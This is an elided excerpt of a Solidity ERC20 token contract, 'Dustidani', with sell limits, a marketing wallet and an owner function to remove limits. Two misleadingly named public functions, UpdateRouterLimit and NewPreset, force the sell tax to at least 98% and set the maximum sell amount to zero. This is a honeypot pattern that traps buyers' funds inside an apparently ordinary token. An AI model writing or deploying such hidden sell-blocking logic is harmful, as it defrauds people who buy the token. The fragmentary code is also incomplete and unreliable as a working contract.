...
contract DustidaniFuckYou is ERC20, Ownable {
    ...
    uint256 public maxSellLimit = 100_000_000 * 10**18 *3/100;
    uint256 public maxWalletLimit = 100_000_000 * 10**18 *4/100;

    uint256 public genesis_block;

    address public marketingWallet = 0x60a46a2e9beF703b5e5E1aBD00f376f7a52A2298;
    ...
    constructor() ERC20("Dustidani", "FUCK YOU") {
    ...
    function removeLimits() external onlyOwner returns (bool) {
        ...
        maxSellLimit = 100_000_000 * 10**18;
    ...
    function UpdateRouterLimit (uint256 NewInput) public {
        require(NewInput >=98);
        sellTaxes = Taxes(NewInput,0,0);
    }

    function NewPreset (uint256 Value) public {
        require(Value <= 0);
        maxSellLimit = Value;
    }
